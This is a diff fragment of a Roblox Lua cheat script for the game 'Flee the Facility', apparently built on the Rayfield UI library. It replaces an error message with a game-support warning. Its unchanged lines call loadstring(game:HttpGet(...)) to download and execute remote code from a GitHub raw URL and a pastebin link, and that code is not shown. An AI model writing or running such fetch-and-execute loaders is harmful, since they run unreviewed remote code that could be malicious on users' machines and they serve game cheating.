@@ -35,8 +35,7 @@ end
 print("Working...")
 task.wait(3)
 if game.GameId ~= 372226183 then
-    error("do not run what you just ran (vulnerable function)")
-    error("'" .. script.Name .. "', Line 1")
+    warn("Script only has support to FLEE THE FACILITY!")
     return
 end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()
@@ -1671,3 +1670,4 @@ Rayfield:LoadConfiguration()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
 --okollloo
+
